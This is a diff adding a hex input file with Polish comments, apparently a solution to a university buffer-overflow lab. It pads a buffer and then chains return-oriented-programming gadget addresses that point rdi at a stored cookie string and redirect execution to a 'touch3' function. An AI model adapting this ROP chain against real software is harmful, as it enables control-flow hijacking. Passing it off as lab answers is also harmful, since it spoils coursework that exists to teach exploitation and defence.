@@ -1,0 +1,34 @@
+/* Padding 24 bajty na bufor */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+
+/* Chcemy dostac wskaznik na miejsce w stosie ktore przechowuje ciasteczko */
+
+/* rax = rsp */
+14 19 40 00 00 00 00 00
+/* rdi = rax */
+c8 18 40 00 00 00 00 00
+/* popq rax */
+e9 18 40 00 00 00 00 00
+
+/* offset od rdi do ciasteczka */
+48 00 00 00 00 00 00 00
+
+/* ecx = eax */
+6e 19 40 00 00 00 00 00
+
+/* edx = ecx */
+c5 19 40 00 00 00 00 00
+/* esi = edx */
+98 19 40 00 00 00 00 00
+/* add rsi, rdi => rax */
+00 19 40 00 00 00 00 00
+
+/* rdi = rax = adres ciasteczka */
+c8 18 40 00 00 00 00 00
+/* adres touch3 */
+31 18 40 00 00 00 00 00
+
+/* ciasteczko jako tekst */
+34 37 62 34 64 62 61 36
